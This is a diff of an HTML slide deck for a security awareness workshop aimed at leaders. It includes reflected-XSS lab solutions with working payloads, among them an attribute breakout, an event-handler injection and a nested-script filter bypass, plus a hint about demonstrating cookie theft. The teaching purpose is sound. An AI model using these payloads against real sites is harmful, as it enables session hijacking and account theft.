-<section id="s102" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Text encoded, attribute raw</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>&lt;&gt;</code> are now encoded in the <b>text</b> sink — but the search box <code>value="…"</code> reflects your input <b>raw</b>. The text payload is inert here; the attribute is the vector.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Break out of the attribute first with <code>"&gt;</code>, then inject your tag.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">"&gt;&lt;img src=x onerror=alert(1)&gt;</div><div class="sol-paynote">close the value=" then add markup</div></div></section>
-<section id="s103" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s101" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><div><div class="sol-cwe">CWE-79 · A03:2021  ·  🎓 training only (no flag)</div><h2 style="margin:.06em 0">Reflected XSS</h2><div class="sol-where">&#128205; /statements — search term reflection</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Run attacker JavaScript in the victim's browser via a reflected value.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The search term is reflected back into the page <b>without encoding</b>, so markup you send becomes part of the page and executes. Which encoding is missing depends on <b>where</b> it's reflected — text vs. an HTML attribute.</p><div class="sol-note"><strong>Note.</strong> Not part of the CTF (<code>ctf_eligible=false</code>) — no flag. At L0 the session cookie has <b>no HttpOnly</b>, so <code>document.cookie</code> includes it — use that to demo cookie theft.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">reflected raw into text</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">naive &lt;script&gt; strip — use handlers/nesting</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">text encoded, attribute raw — break out</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">both contexts encoded</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> <code>htmlspecialchars()</code> on <b>both</b> the text and the attribute reflections; the payload can't break out of either context, so nothing executes.</p></div></div></div></div></section>
+<section id="s102" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Naive &lt;script&gt; strip</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">A single-pass strip removes literal <code>&lt;script&gt;</code>/<code>&lt;/script&gt;</code>, so a plain script tag never fires.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Don't use a script tag — use an event handler, or nest the tag so one strip rebuilds it.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">&lt;img src=x onerror=alert(1)&gt;   ·   &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</div><div class="sol-paynote">event handler needs no &lt;script&gt;</div></div></section>
+<section id="s103" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Text encoded, attribute raw</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>&lt;&gt;</code> are now encoded in the <b>text</b> sink — but the search box <code>value="…"</code> reflects your input <b>raw</b>. The text payload is inert here; the attribute is the vector.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Break out of the attribute first with <code>"&gt;</code>, then inject your tag.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">"&gt;&lt;img src=x onerror=alert(1)&gt;</div><div class="sol-paynote">close the value=" then add markup</div></div></section>
+<section id="s104" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">Polyfill.io, 2024 &mdash; 100,000 websites, one borrowed script</h2>
 <div class="rw mt2">
@@ -1546,7 +1559,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <div class="card yellow-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">What the regulator charged &mdash; British Airways</h3><p class="desc mt1" style="font-size:.88rem">A near-identical technique &mdash; injected JavaScript skimming the payment page for 15 days, around <strong>429,000 customers</strong> &mdash; drew a proposed <strong>&pound;183 million</strong> penalty, finally settled at <strong>&pound;20 million</strong>. Client-side code is in regulatory scope.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> do we have an inventory of every third-party script running on our customer-facing pages &mdash; and who is accountable when one of them changes owner?</p></div>
 </div></section>
-<section id="s104" data-phase="The Chain" class="slide"><div class="slide-inner center">
+<section id="s105" data-phase="The Chain" class="slide"><div class="slide-inner center">
 <p class="sub mb1">Pause &mdash; before we connect the dots</p>
 <h2 class="mb2">What did that stir up?</h2>
 <div class="grid3 mt2" style="gap:1rem;text-align:left">
@@ -1556,7 +1569,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 <p class="big center mt3" style="font-size:clamp(.95rem,1.5vw,1.15rem);color:var(--t2)">Take thirty seconds &mdash; turn to the person next to you. What is one example from your own world?</p>
 </div></section>
-<section id="s105" data-phase="The Chain" class="slide"><div class="slide-inner">
+<section id="s106" data-phase="The Chain" class="slide"><div class="slide-inner">
 <p class="sub mb1">Combining weaknesses</p>
 <h2>No real attacker uses one vulnerability. They chain them.</h2>
 <p class="desc mt2">Rated individually, most of today&rsquo;s findings are a Medium. Here is the same list, read the way an attacker reads it.</p>
@@ -1567,7 +1580,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <div class="card green-left"><h3 style="font-size:1.05rem">What this changes for you</h3><p class="desc mt1">&ldquo;We will fix the Mediums next quarter&rdquo; is a <strong style="color:var(--t1)">risk decision</strong>, not a scheduling one. The right question is not &ldquo;how bad is this finding?&rdquo; but <strong style="color:var(--t1)">&ldquo;what does this finding unlock?&rdquo;</strong></p></div>
 </div>
 </div></section>
-<section id="s106" data-phase="The Chain" class="slide"><div class="slide-inner">
+<section id="s107" data-phase="The Chain" class="slide"><div class="slide-inner">
 <p class="sub mb1">The good news</p>
 <h2>A chain breaks at <em>any</em> link.</h2>
 <p class="desc mt2">The attacker needs all seven steps to work. You only need to break one.</p>
@@ -1579,22 +1592,20 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 <p class="big center mt3">Defence does not require perfection.<br/>It requires that the attacker&rsquo;s path has at least one reliable wall across it.</p>
 </div></section>
-<section id="s107" data-phase="The Chain" class="slide">
+<section id="s108" data-phase="The Chain" class="slide">
 <div class="slide-inner center">
 <h2 style="color:var(--green)">You just saw what attackers see. That changes everything.</h2>
-<p class="big mt2" style="color:var(--t2)">Investing two hours to understand these attack patterns first-hand puts you ahead of most technology leaders in the industry. You now have something most don't: a <strong style="color:var(--t1)">visceral understanding</strong> of how simple these attacks are — and how simple the fixes can be.</p>
+<p class="big mt2" style="color:var(--t2)">You now have something most don't: a <strong style="color:var(--t1)">visceral understanding</strong> of how simple these attacks are — and how simple the fixes can be.</p>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="margin-bottom:.8rem">You now know the questions to ask:</p>
 <div class="flex-col" style="max-width:700px;margin-left:auto;margin-right:auto;text-align:left">
 <p class="desc" style="font-size:1.05rem">✅ <em>"Does our SAST pipeline run before every merge?"</em></p>
 <p class="desc" style="font-size:1.05rem">✅ <em>"Do we have ownership checks on every data query?"</em></p>
-<p class="desc" style="font-size:1.05rem">✅ <em>"When was our last pen test? What happened to the findings?"</em></p>
-<p class="desc" style="font-size:1.05rem">✅ <em>"Is security training part of developer onboarding?"</em></p>
-</div>
+<p class="desc" style="font-size:1.05rem">✅ <em>"When was our last pen test? What happened to the findings?"</em></p></div>
 <p class="mt2 desc" style="font-size:1rem">The fixes were 1–3 lines of code. Your influence as leaders ensures those lines get written.</p>
 </div>
 </section>
-<section id="s108" data-phase="AI" class="slide section-slide">
+<section id="s109" data-phase="AI" class="slide section-slide">
 <div class="slide-inner center">
 <div class="icon">🔵</div>
 <p class="sub">Phase 5</p>
@@ -1602,7 +1613,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="big mt2" style="color:var(--t2)">The Accelerant</p>
 </div>
 </section>
-<section id="s109" data-phase="AI" class="slide">
+<section id="s110" data-phase="AI" class="slide">
 <div class="slide-inner">
 <h3 class="mb1" style="color:var(--red)">AI as Attacker</h3>
 <p class="desc mb2">Everything demonstrated in this session — the SQL injection payloads, the JWT forgery, the IDOR patterns, the command injection — an AI model can generate all of it from a single prompt.</p>
@@ -1618,7 +1629,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 </div>
 </section>
-<section id="s110" data-phase="AI" class="slide">
+<section id="s111" data-phase="AI" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">The Bar Has Dropped to Zero</h3>
 <div class="card" style="background:rgba(239,68,68,.05);border-color:rgba(239,68,68,.2)">
@@ -1634,7 +1645,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="big mt2 center">AI can accelerate payload design and testing, but its output must be authorised, validated and constrained. It does not remove the need for technical expertise.</p>
 </div>
 </section>
-<section id="s111" data-phase="AI" class="slide">
+<section id="s112" data-phase="AI" class="slide">
 <div class="slide-inner">
 <h3 class="mb1" style="color:var(--green)">AI as Defender</h3>
 <p class="desc mb2">The same AI capabilities that enable attacks also power defence at unprecedented speed and scale.</p>
@@ -1659,7 +1670,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="center mt2 desc" style="font-size:1rem;color:var(--amber)">« Insert your AI scan results of BankSploit here »</p>
 </div>
 </section>
-<section id="s112" data-phase="AI" class="slide">
+<section id="s113" data-phase="AI" class="slide">
 <div class="slide-inner">
 <h3 class="mb2 center">AI Accelerates Both Sides Equally</h3>
 <div class="vs mt2">
@@ -1676,7 +1687,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="big center">The difference is who adopts it first and uses it consistently.</p>
 </div>
 </section>
-<section id="s113" data-phase="AI" class="slide">
+<section id="s114" data-phase="AI" class="slide">
 <div class="slide-inner">
 <h3 class="mb1" style="color:var(--amber)">What AI Still Cannot Do</h3>
 <p class="desc mb2">AI is a powerful tool, but these require a human in the loop — today and for the foreseeable future.</p>
@@ -1708,7 +1719,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 </div>
 </section>
-<section id="s114" data-phase="AI" class="slide">
+<section id="s115" data-phase="AI" class="slide">
 <div class="slide-inner center">
 <h2>AI is a force multiplier for your security teams, not a replacement.</h2>
 <p class="big mt2" style="color:var(--t2)">AI can find the SQL injection in milliseconds. But a human decided to skip the code review that would have caught it. AI can detect the brute-force in real time. But a human decided not to fund the SOC tooling.</p>
@@ -1716,7 +1727,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="big">It still takes a human to decide that security matters.<br/>To fund the tools. To set the culture.<br/>To respond when the alert fires at 2 AM.</p>
 </div>
 </section>
-<section id="s115" data-phase="Takeaways" class="slide">
+<section id="s116" data-phase="Takeaways" class="slide">
 <div class="slide-inner center">
 <h2>Every vulnerability we found today touches at least two security functions.</h2>
 <div class="flex-col mt3 gap2" style="max-width:700px;margin-left:auto;margin-right:auto;text-align:left">
@@ -1730,7 +1741,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="big mt1" style="color:var(--t2)">Fund it, connect it, hold it accountable as one.</p>
 </div>
 </section>
-<section id="s116" data-phase="Takeaways" class="slide"><div class="slide-inner">
+<section id="s117" data-phase="Takeaways" class="slide"><div class="slide-inner">
 <p class="sub mb1">What you take back</p>
 <h2 class="mb2">Sharper questions &mdash; before it reaches production</h2>
 <div class="grid2 gap2">
@@ -1753,7 +1764,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 <p class="big center mt3">You do not need to know the answer.<br/>You need to ask the question early enough that somebody has to go and find one.</p>
 </div></section>
-<section id="s117" data-phase="Takeaways" class="slide">
+<section id="s118" data-phase="Takeaways" class="slide">
 <div class="slide-inner">
 <h3 class="mb1">When a High-Risk Finding Lands on Your Desk</h3>
 <p class="desc mb2">Before raising an ORAC (Operational Risk Acceptance Certificate), ask these questions:</p>
@@ -1779,7 +1790,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="big center">Risk acceptance is not risk ignorance.<br/>Accept with controls, timelines, and accountability.</p>
 </div>
 </section>
-<section id="s118" data-phase="Takeaways" class="slide">
+<section id="s119" data-phase="Takeaways" class="slide">
 <div class="slide-inner">
 <div class="flex-row mb2">
 <span class="badge badge-green">🟢 Takeaways</span>
@@ -1801,14 +1812,14 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 </div>
 </section>
-<section id="s119" data-phase="Takeaways" class="slide section-slide">
+<section id="s120" data-phase="Takeaways" class="slide section-slide">
 <div class="slide-inner center">
 <p style="font-size:5rem;margin-bottom:1.5rem">❓</p>
 <h1>Questions &amp; Discussion</h1>
 <p class="big mt2" style="color:var(--t2)">What surprised you? What concerned you?<br/>What will you do differently tomorrow?</p>
 </div>
 </section>
-<section id="s120" data-phase="Takeaways" class="slide section-slide">
+<section id="s121" data-phase="Takeaways" class="slide section-slide">
 <div class="slide-inner center">
 <h1 class="gradient" style="font-size:clamp(2rem,4vw,3rem)">Thank you.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
@@ -1818,7 +1829,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p style="color:var(--t3);font-size:.9rem;margin-top:.5rem">« Ankit Rai • India Lead of Penetration Testing Team • Oct 2026 »</p>
 </div>
 </section>
-<section id="s121" data-phase="Takeaways" class="slide"><div class="slide-inner center">
+<section id="s122" data-phase="Takeaways" class="slide"><div class="slide-inner center">
 <p class="sub mb1">Where we leave it</p>
 <h1 class="gradient" style="font-size:clamp(1.7rem,3.4vw,2.6rem)">You will not leave a penetration tester.</h1>
 <p class="big mt2">You will leave able to tell the difference between<br/><em>&ldquo;we are secure&rdquo;</em> and <em>&ldquo;no one has checked.&rdquo;</em></p>
@@ -1854,6 +1865,31 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
           var no = o.map(shift);
           var di = no.indexOf('s'+(P+1));             /* the demo's new id */
           no.splice(di<0 ? no.length : di, 0, 's'+P); /* head goes just before it */
+          localStorage.setItem(ORDER_KEY, JSON.stringify(no));
+          var rawH = localStorage.getItem(HIDE_KEY);
+          if(rawH){ localStorage.setItem(HIDE_KEY, JSON.stringify(JSON.parse(rawH).map(shift))); }
+        }
+      }
+      localStorage.setItem(MIG_KEY, '1');
+    }catch(e){}
+  })();
+
+  /* One-shot migration: the G2 copiable-queries slide was inserted at position P,
+     right after the G2 L0 demo (now at s(P-1)). A saved arrangement from just
+     before (one slide shorter) is shifted so every id >= P moves up by one, and
+     the new id (sP) is slotted in immediately AFTER the demo. Runs once. */
+  (function migrateInsertedSlideG2(){
+    var MIG_KEY = 'bs_ws_mig_g2queries_v1', P = 84;
+    try{
+      if(localStorage.getItem(MIG_KEY)) return;
+      var shift = function(id){ var k = parseInt(id.slice(1),10); return (k>=P) ? ('s'+(k+1)) : id; };
+      var rawO = localStorage.getItem(ORDER_KEY);
+      if(rawO){
+        var o = JSON.parse(rawO);
+        if(o.length === defaultOrder.length - 1){     /* the pre-insert arrangement */
+          var no = o.map(shift);
+          var ai = no.indexOf('s'+(P-1));             /* the G2 demo (unshifted) */
+          no.splice(ai<0 ? no.length : ai+1, 0, 's'+P); /* queries slide goes just after it */
           localStorage.setItem(ORDER_KEY, JSON.stringify(no));
           var rawH = localStorage.getItem(HIDE_KEY);
           if(rawH){ localStorage.setItem(HIDE_KEY, JSON.stringify(JSON.parse(rawH).map(shift))); }
@@ -2005,7 +2041,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
     }
   });
   document.addEventListener('click',function(e){
-    if(e.target.closest('#slide-mgr,#mgr-btn,#timer-widget,a,button,pre,code,input,select')) return;
+    if(e.target.closest('#slide-mgr,#mgr-btn,#timer-widget,a,button,pre,code,input,select,.sol-pay')) return;
     if(mgr.classList.contains('open')) return;
     if(e.clientX < window.innerWidth*0.3){ prev(); } else { next(); }
   });
